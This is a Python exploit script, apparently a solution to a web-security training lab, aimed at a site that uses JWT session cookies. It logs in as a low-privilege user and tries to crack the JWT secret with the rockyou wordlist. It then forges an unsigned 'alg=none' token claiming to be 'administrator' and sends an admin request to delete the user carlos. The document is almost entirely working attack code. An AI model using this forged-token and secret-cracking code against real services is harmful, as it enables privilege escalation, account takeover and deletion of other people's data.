import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import base64
import json
from urllib.parse import urljoin
import jwt
# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Define proxies (adjust if necessary)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

wordlist_file = '/usr/share/wordlists/rockyou.txt'




# Function to get CSRF token
def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf_input = soup.find("input", {'name': 'csrf'})
    if csrf_input:
        csrf = csrf_input['value']
        print(f"(+) CSRF token found: {csrf}")
        return csrf
    else:
        print("(-) CSRF token not found on the page.")
        sys.exit(-1)

# Function to login and retrieve JWT token from cookies
def login(url, s, username, password):
    login_url = urljoin(url, '/login')
    csrf_token = get_csrf_token(s, login_url)

    # Send login request with CSRF token
    login_params = {'csrf': csrf_token, 'username': username, 'password': password}
    r = s.post(login_url, data=login_params, verify=False, proxies=proxies, allow_redirects=False)

    if r.status_code == 302:
        print("(+) Login is successful.")
        # Attempt to retrieve JWT from session cookies
        jwt_token = r.cookies.get('session')
        if jwt_token:
            print(f"(+) JWT token retrieved: {jwt_token}")
            return jwt_token
        else:
            print("(-) JWT not found in session cookies.")
            sys.exit(-1)
    else:
        print("(-) Login not successful.")
        sys.exit(-1)

# JWT Bypass via flawed signature verification (alg=none)
def bypass_flawed_signature_verification(url, token):
    def attempt_fuzzing(secret_key, algorithm):
        try:
            decoded = jwt.decode(token, secret_key, algorithms=[algorithm])
            print(f"Valid key found: {secret_key}")
            print(f"Decoded payload: {decoded}")
            return True
        except jwt.InvalidSignatureError:
            return False


    def fuzz_secret_key(wordlist):
        header = jwt.get_unverified_header(token)
        algorithm = header.get("alg")
        if not algorithm:
            print("Algorithm not found in JWT header.")
            return None
        else:
            print(f"Algorithm: {algorithm}")

        with open(wordlist, "r") as file:
            for line in file:
                secret_key = line.strip()
                if attempt_fuzzing(secret_key, algorithm):
                    return secret_key
        return None
    print("(+) Performing bypass via flawed signature verification (alg=none)...")
    # Start fuzzing
    found_key = fuzz_secret_key(wordlist_file)
    if found_key:
        print(f"\nSecret key found: {found_key}")
    else:
        print("No valid secret key found.")

    # Split JWT into header, payload, and signature
    header, payload, signature = token.split('.')

    # Decode the payload (base64 -> bytes -> string -> dict)
    decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
    payload_dict = json.loads(decoded_payload.decode())

    # Modify the payload to escalate privileges (e.g., change sub to administrator)
    payload_dict['sub'] = 'administrator'
    print(f"(+) Modified payload: {json.dumps(payload_dict, indent=4)}")

    # Re-encode the modified payload (Base64 URL encoding)
    modified_payload_b64 = base64.urlsafe_b64encode(json.dumps(payload_dict).encode()).rstrip(b'=').decode()

    # Modify the header to set "alg" to "none"
    header_dict = json.loads(base64.urlsafe_b64decode(header + '=' * (-len(header) % 4)).decode())
    header_dict['alg'] = 'none'
    modified_header_b64 = base64.urlsafe_b64encode(json.dumps(header_dict).encode()).rstrip(b'=').decode()

    # Create the modified token (header.payload.) - no signature
    modified_token = f"{modified_header_b64}.{modified_payload_b64}."
    print(f"(+) Modified JWT token (alg=none): {modified_token}\n")

    # Use the modified token in an attempt to delete the user Carlos
    print("(+) Attempting to delete the user Carlos with modified token...")
    cookies = {'session': modified_token}
    delete_carlos_url = urljoin(url, '/admin/delete?username=carlos')
    r = requests.get(delete_carlos_url, cookies=cookies, verify=False, proxies=proxies)
    
    if "User deleted successfully" in r.text:
        print("(+) Successfully deleted the Carlos user!")
    else:
        print("(-) Attack was unsuccessful")

# Main function
def main():
    if len(sys.argv) != 2:
        print(f"(+) Usage: {sys.argv[0]} <url>")
        print(f"(+) Example: {sys.argv[0]} www.example.com")
        sys.exit(-1)

    url = sys.argv[1]
    regular_username = "wiener"
    regular_password = "peter"
    
    # Start a session to persist cookies
    s = requests.Session()

    # Log in as a regular user
    regular_user_jwt = login(url, s, regular_username, regular_password)

    # If login is successful, perform the attack
    if regular_user_jwt:
        # Perform bypass via flawed signature verification (alg=none)
        bypass_flawed_signature_verification(url, regular_user_jwt)

if __name__ == "__main__":
    main()
